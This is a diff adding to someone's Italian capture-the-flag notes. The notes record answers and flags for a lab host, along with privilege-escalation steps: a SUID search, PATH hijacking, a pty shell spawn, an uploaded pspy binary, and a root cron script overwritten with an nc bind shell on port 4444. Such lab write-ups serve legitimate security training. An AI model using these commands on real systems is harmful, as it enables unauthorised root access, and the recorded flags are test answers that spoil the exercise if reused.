@@ -99,10 +99,46 @@ sto provando a fare
 ```
 una volta creato il file procedo con 
 `ssh -i ./file muntrea-operator@192.168.14.15`
+mi ha dato problemi di permessi ho fatto chmod 600 ./file
 VDSI{nucl3ar_t3ch_acc3ss_gr4nt3d}
 #### Domanda 9
-find / -group muntrea-operator 2>/dev/null
+il file in questione è stato trovato con
+`find / -perm -u=s -type f 2>/dev/null`
+ed era
+`/usr/bin/sys-monitor`
+#### Domanda 10
+il comando cat è presente dentro il file .sh che esegue
+#### Domanda 11
+letta con cat `admin.txt`
+`VDSI{4dm1n_fl4g_h3r3}`
+#### Domanda 12
+sto provando path hijacking
+`export PATH=/tmp:$PATH`
+importato python bash buona
+`python3 -c 'import pty; pty.spawn("/bin/bash")'`
+mi sono aperto una shell con /bin/bash -p dentro il file sh
+provo a fa sta cosa
 
+fatto `find / -user muntrea-sysadmin 2>/dev/null`
+/opt/scripts/internal/infra/monitor-critical-services.sh
+scrivo questo dentro il file
+```scss
+#!/bin/bash
+# System maintenance script
+echo "Running periodic checks..."
+echo "ciao" >> /tmp/shellaperta.txt
+nc -lvp 4444 -e /bin/bash
+```
+e faccio
+`nc 192.168.14.15 4444`
+`VDSI{mun7r3a_c0ntr0l_full_m4st3ry}`
+
+copiare un file nella cartella
+`scp /percorso/locale/pspy64 utente@host_remoto:/tmp/`
+oppure importando `scp ./pspy muntrea-filemanager@192.168.14.15:/tmp/`
+all'esecuzione mostra molte volte l'esecuzione di questo cronjob
+`2026/05/15 20:33:32 CMD: UID=0     PID=8579   | /bin/bash /opt/scripts/internal/infra/monitor-critical-services.sh `
+palese un cron eseguito dal root quindi daje
 #### Faccio  SIM_STNDA: Infiltrato Sbadato
 keepass2john secrets.kdbx
 passkeepass.txt
@@ -112,3 +148,4 @@ VDSI{k33p4ss_cr4ck_succ3ss_2026}
 poi ho anche 
 filtro usato frame contains "test"
 
+##### SIM_STNDB: Antivirus Sicuro
